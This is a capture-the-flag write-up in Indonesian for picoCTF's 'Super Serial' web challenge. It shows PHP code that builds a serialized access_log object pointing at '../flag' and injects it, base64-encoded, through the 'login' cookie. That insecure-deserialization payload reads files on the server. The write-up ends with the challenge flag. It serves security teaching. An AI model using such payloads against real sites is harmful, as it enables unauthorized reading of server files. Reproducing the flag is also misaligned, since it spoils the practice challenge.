# Super Serial
- Link: https://play.picoctf.org/practice/challenge/180?category=1&page=2

## Tantangan
Try to recover the flag stored on this website http://mercury.picoctf.net:3449/

## Penyelesaian
- Buka URL http://mercury.picoctf.net:3449/ di browser

![alt text](https://github.com/rahardian-dwi-saputra/picoCTF-writeup/blob/main/Web%20Exploitations/Super%20Serial/assets/super%20serial%201.JPG)

- Jika kita buka path `robots.txt` di url http://mercury.picoctf.net:3449/robots.txt terdapat path dihidden sebagai berikut

![alt text](https://github.com/rahardian-dwi-saputra/picoCTF-writeup/blob/main/Web%20Exploitations/Super%20Serial/assets/super%20serial%202.JPG)

- Jika kita buka halaman tersebut di url http://mercury.picoctf.net:3449/admin.phps halaman tersebut tidak ditemukan

![alt text](https://github.com/rahardian-dwi-saputra/picoCTF-writeup/blob/main/Web%20Exploitations/Super%20Serial/assets/super%20serial%203.JPG)

- Sekarang kita coba buka `index.phps` dengan url http://mercury.picoctf.net:3449/index.phps maka terdapat source code sebagai berikut. Jika anda tidak dapat membuka source code nya, silahkan klik kanan lalu pilih view page source. Disini terdapat fungsi pengaturan cookie dengan nama `login` dan value nya diencode menggunakan base64

![alt text](https://github.com/rahardian-dwi-saputra/picoCTF-writeup/blob/main/Web%20Exploitations/Super%20Serial/assets/super%20serial%204.JPG)

- Sekarang kita coba buka `cookie.phps` dengan url http://mercury.picoctf.net:3449/cookie.phps maka terdapat source code sebagai berikut. Jika anda tidak dapat membuka source code nya, silahkan klik kanan lalu pilih view page source

![alt text](https://github.com/rahardian-dwi-saputra/picoCTF-writeup/blob/main/Web%20Exploitations/Super%20Serial/assets/super%20serial%205.JPG)

- Sekarang kita coba buka `authentication.phps` dengan url http://mercury.picoctf.net:3449/authentication.phps maka terdapat source code sebagai berikut. Jika anda tidak dapat membuka source code nya, silahkan klik kanan lalu pilih view page source

![alt text](https://github.com/rahardian-dwi-saputra/picoCTF-writeup/blob/main/Web%20Exploitations/Super%20Serial/assets/super%20serial%206.JPG)

- Sekarang kita coba akses halaman http://mercury.picoctf.net:3449/authentication.php

![alt text](https://github.com/rahardian-dwi-saputra/picoCTF-writeup/blob/main/Web%20Exploitations/Super%20Serial/assets/super%20serial%207.JPG)

- Klik kanan di halaman tersebut lalu pilih Inspect

![alt text](https://github.com/rahardian-dwi-saputra/picoCTF-writeup/blob/main/Web%20Exploitations/Super%20Serial/assets/super%20serial%208.JPG)

- Kemudian pergi ke tab storage. Disini kita bisa mencoba untuk menambahkan cookie `login` dengan value yang diencode dengan base64

![alt text](https://github.com/rahardian-dwi-saputra/picoCTF-writeup/blob/main/Web%20Exploitations/Super%20Serial/assets/super%20serial%209.JPG)

- Buka editor PHP online https://legacy-sandbox.onlinephpfunctions.com/ lalu ketikkan code berikut lalu execute code tersebut
```sh
<?php

print(urlencode(base64_encode(serialize("test"))));
```

![alt text](https://github.com/rahardian-dwi-saputra/picoCTF-writeup/blob/main/Web%20Exploitations/Super%20Serial/assets/super%20serial%2010.JPG)

- Copy value tersebut dan tambahkan ke value cookie `login` dan refresh halaman tersebut
```sh
czo0OiJ0ZXN0Ijs%3D
```

![alt text](https://github.com/rahardian-dwi-saputra/picoCTF-writeup/blob/main/Web%20Exploitations/Super%20Serial/assets/super%20serial%2011.JPG)

![alt text](https://github.com/rahardian-dwi-saputra/picoCTF-writeup/blob/main/Web%20Exploitations/Super%20Serial/assets/super%20serial%2012.JPG)

- Ubah source code PHP diatas menjadi sebagai berikut lalu execute code tersebut
```sh
<?php
        
class access_log
{
	public $log_file = "../flag";
}

print(urlencode(base64_encode(serialize(new access_log()))));
```

![alt text](https://github.com/rahardian-dwi-saputra/picoCTF-writeup/blob/main/Web%20Exploitations/Super%20Serial/assets/super%20serial%2013.JPG)

- Copy value tersebut dan tambahkan ke value cookie `login` dan refresh halaman tersebut
```sh
TzoxMDoiYWNjZXNzX2xvZyI6MTp7czo4OiJsb2dfZmlsZSI7czo3OiIuLi9mbGFnIjt9
```

![alt text](https://github.com/rahardian-dwi-saputra/picoCTF-writeup/blob/main/Web%20Exploitations/Super%20Serial/assets/super%20serial%2014.JPG)

![alt text](https://github.com/rahardian-dwi-saputra/picoCTF-writeup/blob/main/Web%20Exploitations/Super%20Serial/assets/super%20serial%2015.JPG)

- Flag
```sh
picoCTF{th15_vu1n_1s_5up3r_53r1ous_y4ll_b4e3f8b1}
```